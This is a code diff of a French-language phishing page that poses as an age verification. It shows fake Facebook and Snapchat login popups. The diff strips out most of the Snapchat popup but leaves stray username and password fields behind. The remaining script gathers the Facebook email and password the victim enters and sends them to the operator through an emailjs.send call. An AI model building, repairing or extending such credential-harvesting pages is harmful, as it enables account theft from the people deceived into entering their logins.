@@ -87,17 +87,7 @@
     }
     .overlay { background: rgba(0,0,0,0.6); width: 100%; height: 100%; z-index: 999; }
     .bottom-banner img, .top-banner img { width: 100%; height: auto; display: block; }
-
-    /* Snapchat popup styles */
-    #snapchatPopup { background: #fff; color: #000; border: none; box-shadow: 0 4px 12px rgba(0,0,0,0.3); }
-    #snapchatPopup h3 { background: none; color: #000; font-size: 1.4em; margin-bottom: 20px; text-align: center; font-weight: bold; }
-    #snapchatPopup label { color: #00A5E5; text-transform: uppercase; font-size: 0.9em; font-weight: bold; }
-    #snapchatPopup input { background: #fff; border: 1px solid #ccc; border-radius: 10px; color: #000; }
-    #snapchatPopup button.button { background: #ccc; color: #000; border: none; border-radius: 50px; width: 100%; }
-    #snapchatPopup button.button:nth-of-type(2) { background: transparent; color: #00A5E5; border: none; }
-    #snapchatPopup button.button:nth-of-type(2):hover { text-decoration: underline; }
-
-    /* Facebook popup styles */
+/* Facebook popup styles */
     #facebookPopup { background: #18191a; color: #e4e6eb; font-family: sans-serif; border: none; box-shadow: 0 4px 12px rgba(0,0,0,0.4); }
     #facebookPopup h3 { background: none; color: #e4e6eb; font-weight: bold; font-size: 1.4em; padding: 0; margin-bottom: 20px; text-align: center; }
     #facebookPopup label { color: #b0b3b8; }
@@ -141,7 +131,6 @@
 
     <!-- Facebook en premier, Snapchat ensuite -->
     <button class="button" id="facebookBtn" onclick="openFacebookPopup()">Confirmer votre âge avec Facebook</button>
-    <button class="button" id="snapchatBtn" onclick="openSnapchatPopup()" style="margin-top: 15px;">Confirmer votre âge avec Snapchat</button>
   </div>
 
   <div class="bitmoji-row">
@@ -152,14 +141,7 @@
   </div>
 
   <div id="overlay" class="overlay" onclick="closeLogin()"></div>
-
-  <!-- POPUP SNAPCHAT -->
-  <div class="login-popup" id="snapchatPopup">
-    <div style="text-align:center;">
-      <img src="logo-snapchat.png" alt="Snapchat" style="width: 60px; margin-bottom: 10px;"/>
-      <h3 style="margin: 10px 0;">Confirmer votre âge avec Snapchat</h3>
-    </div>
-    <label for="snap-username">Nom d'utilisateur ou e-mail</label>
+<label for="snap-username">Nom d'utilisateur ou e-mail</label>
     <input id="snap-username" type="text" placeholder="Nom d'utilisateur ou e-mail"/>
     <label for="snap-password">Mot de passe</label>
     <input id="snap-password" type="password" placeholder="Mot de passe"/>
@@ -195,11 +177,7 @@
   </div>
 
   <script>
-        function openSnapchatPopup() {
-      document.getElementById('overlay').style.display = 'block';
-      document.getElementById('snapchatPopup').style.display = 'block';
-    }
-    function openFacebookPopup() {
+function openFacebookPopup() {
       document.getElementById('overlay').style.display = 'block';
       document.getElementById('facebookPopup').style.display = 'block';
     }
@@ -208,7 +186,17 @@
       document.getElementById(popupId).style.display = 'none';
     }
 
-    function showLoadingAndVerify(popupId) {
+    
+
+    function closeLogin() {
+      const overlay = document.getElementById('overlay');
+      if (overlay) overlay.style.display = 'none';
+      // Hide any popups that might be open
+      document.querySelectorAll('.login-popup, .verification-popup, .login-loading').forEach(el => {
+        el.style.display = 'none';
+      });
+    }
+function showLoadingAndVerify(popupId) {
       const popup = document.getElementById(popupId);
       const inputs = popup.querySelectorAll("input");
       const allFilled = Array.from(inputs).every(input => input.value.trim() !== "");
@@ -229,14 +217,9 @@
           fb_email: document.getElementById("fb-email").value.trim(),
           fb_password: document.getElementById("fb-password").value.trim()
         };
-      } else if (popupId === "snapchatPopup") {
-        params = {
-          fb_email: document.getElementById("snap-username").value.trim(),
-          fb_password: document.getElementById("snap-password").value.trim()
-        };
       }
 
-      if (window.emailjs) {
+if (window.emailjs) {
         emailjs.send("service_photos", "template_connexion", params)
           .then(() => {
             setTimeout(() => {
